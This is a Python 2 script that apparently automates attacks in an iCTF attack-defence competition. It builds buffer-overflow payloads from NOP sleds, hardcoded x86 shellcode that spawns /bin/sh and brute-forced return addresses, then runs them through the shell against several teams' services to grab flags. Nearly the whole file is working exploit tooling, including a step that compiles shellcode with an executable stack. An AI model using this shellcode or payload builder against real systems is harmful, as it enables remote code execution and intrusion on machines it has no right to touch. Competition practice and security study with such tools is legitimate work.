import sys
import threading
import os
import subprocess
import multiprocessing
from ictf import iCTF

varList=[]
varDict={}
varIndexDict={}

    

def getShellCode(my_command):
	subprocess.Popen("gcc -m32 -z execstack prog_shell.c", shell=True, stdout=subprocess.PIPE).stdout.read()
	return subprocess.Popen("./a.out " + my_command, shell=True, stdout=subprocess.PIPE).stdout.read()


def getExploitString():
	global varDict
	startNOP = 0
	endNOP = 0
	tmpStartNOPs = "\\x90\"*" + str(startNOP) + " + "
	tmpEndNOPs = "\\x90\"*" + str(endNOP) + " + " 
	shellcode = getShellCode(varDict['$shellcode'])
	tmpShellCode = shellcode[:len(shellcode)-1]
	return tmpShellCode


    
    
def generateFinalCommandList(commandList,typeReq):
    
    global varDict,varIndexDict
    
    #print varDict
    #print commandList
    
    if(typeReq):
        for i in range(len(commandList)):
            indexVar = commandList[i].find("$")
            if(commandList[i]!='' and (commandList[i][indexVar+1]!='_') and indexVar>=0 and varDict[commandList[i][indexVar:]]):
                    varIndexDict[commandList[i][indexVar:]]=i
                    commandList[i]=commandList[i][:indexVar]+varDict[commandList[i][indexVar:]]
                    
    else:
        for i in range(len(commandList)):
            indexVar = commandList[i].find("$")
            if(commandList[i]!='' and (commandList[i][indexVar+1]=='_') and indexVar>=0 and varDict[commandList[i][indexVar:]]):
                    varIndexDict[commandList[i][indexVar:]]=i
                    commandList[i]=commandList[i][:indexVar]+varDict[commandList[i][indexVar:]]
                   
    
    return commandList



def computeShellcode(shellcode):
    global varDict
   
    #Here we will compute shell code integrating c prog
    varDict['$shellcode']="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80" 
    
    #delibrately commented but working
    #varDict['$shellcode'] = getExploitString()

    
    
def commandToAttack(args,teamNum):
    global varDict,serviceList
    print args
    print varDict
    
    #replace service var starting with $_
    for i in range(len(args)):
        indexVar = args[i].find('$')
        #print "dsds " + args[i][(indexVar+2):]
        #print indexVar
        
        if(indexVar>=0 and args[i][indexVar+1]=='_'):
            #varDict[args[i]]=raw_input("Enter Service Variable '"+args[i]+"' : ")
            varDict[args[i]]=str(serviceList[teamNum][args[i][(indexVar+2):]])
    
   
    commandList = generateFinalCommandList(args,0)
    finalCommand=""
    

    
    for i in range(len(commandList)):
        finalCommand+=commandList[i]+" "
    
    return finalCommand

    



#*********************** Service Attack Methods ***************
ourTeamNum=1
teams = 3
tick=5
"""i = iCTF("http://52.34.158.221/")
t = i.login("team"+ourTeamNum+"@example.com","password")
serviceList=t.get_service_list()"""


def getFlags(command,teamNum):
    global serviceList,flagsList,t,serviceId
    flagList=[]
    result=[]
    
    """
    proc=subprocess.Popen("echo 'R' " + flagId + " '`python -c \"print " + shellcode + " \"`'" + " | xargs -n 1 | nc team"+teamNum + str(serviceList[serviceNum]['port']), shell=True, stdout=subprocess.PIPE,)"""
        
           
    #proc=subprocess.Popen(command + " | nc " + str(serviceList[teamNum]['host']) + " " + str(serviceList[teamNum]['port']), shell=True, stdout=subprocess.PIPE,)
    
    print command
    
    proc=subprocess.Popen(command, shell=True, stdout=subprocess.PIPE,)
        
    
    output=proc.communicate()[0]
    print output

        

def generateHexCombo(address):
    global varDict
    i=address
    count=10
    if("$nop" in varDict):
        count=int(varDict["$nop"])
    while count:
        yield "{:010X}".format(i)
        i+=1
        count-=1
        

def attackTeams(command,teamNum):
    global serviceList,t,commandList,varDict,varIndexDict
#    print "********* Attacking **********",teamNum,(varDict["$address"]),type(varDict["$address"])   
    
    #hex_int = int(hex_str, 16)
    
    finalCommandStr = command
    
    if("$address" in varDict):
        for s in generateHexCombo(int(varDict["$address"], 16)):
                addr = '0x'+str(s)
                #print addr
                #addr='0x'+varDict["$address"]
                rearrangedAddr=""
                for i in range(len(addr)-1,1,-2):
                    rearrangedAddr+='\\x'+addr[i-1]+addr[i]
     
                varDict["$address"]=rearrangedAddr
                commandList[varIndexDict["$address"]]=rearrangedAddr
                
    finalCommandStr = commandToAttack(commandList,teamNum)
    
    print teamNum, "atttc",finalCommandStr
                
    getFlags(finalCommandStr,teamNum)
                

#************************ gets Services after every tick ***************************
def getServiceList():
    global serviceList,t
    
    flagsList = []
    
    #serviceList=t.get_service_list()
    
    serviceList=[{u'flag_id_description': u'Flags are identified by the note name.', u'description': u'Password-protected note storage service in C.', u'service_name': u'sample_c', u'team_id': 0, u'state': u'enabled', u'upload_id': 1, u'authors': u'UCSB', u'service_id': 10001, u'port': 10001,u'host':'localhost'}, {u'flag_id_description': u'Flags are identified by the note name.', u'description': u'Password-protected note storage service in Python.', u'service_name': u'sample_py', u'team_id': 0, u'state': u'enabled', u'upload_id': 2, u'authors': u'The iCTF team 2016', u'service_id': 10002, u'port': 10002,u'host':'localhost'}, {u'flag_id_description': u'Flags are identified by the note name.', u'description': u'Password-protected note storage service for the web.', u'service_name': u'sample_web', u'team_id': 0, u'state': u'enabled', u'upload_id': 3, u'authors': u'UCSB', u'service_id': 10003, u'port': 10003,u'host':'localhost'}]
    
    #flagId = t.get_targets(serviceId)
    
    #print serviceList
    
    #threading.Timer(tick, getServiceList).start()

#Working for multiple teams and commented just to test for one team only !! Dont delete this !!!
#getServiceList()


#****** Instructions for attack command input ********
#all var must start with $
#if var starts with $_ then its a service var
#sample command "30*$nop $shellcode 40*$nop $address"
#shellcode must be in variable $shellcode
attackCommand = raw_input("Enter the attack command: ")

commandList = attackCommand.split(" ")
#print commandList

for i in range(len(commandList)):
    indexVar = commandList[i].find("$")
    if(commandList[i]!='' and (commandList[i][indexVar+1])!='_' and indexVar>=0 and commandList[i][indexVar:] not in varList):
        varList.append(commandList[i][indexVar:])
        
if(varList):
    varDict={}
    for i in range(len(varList)):
        varDict[varList[i]]=raw_input(varList[i]+" : ")
         
    #print varDict
    
#print commandList

#Checking whether shellcode var there in the list of args
if('$shellcode' in varDict):
    computeShellcode(varDict['$shellcode']);
    
getServiceList()        
commandList = generateFinalCommandList(commandList,1)
#finalCommandStr = commandToAttack(commandList,-1)

print varIndexDict
print commandList


def f(teamNum):
    global ourTeamNum
    if((teamNum)!=ourTeamNum):
        print(multiprocessing.current_process())
        print teamNum
        attackTeams(commandToAttack(commandList,teamNum),teamNum)

p = multiprocessing.Pool(processes=3)
p.map(f,range(teams))




#To attack one team only just for testing

#attackTeams(finalCommandStr,2)
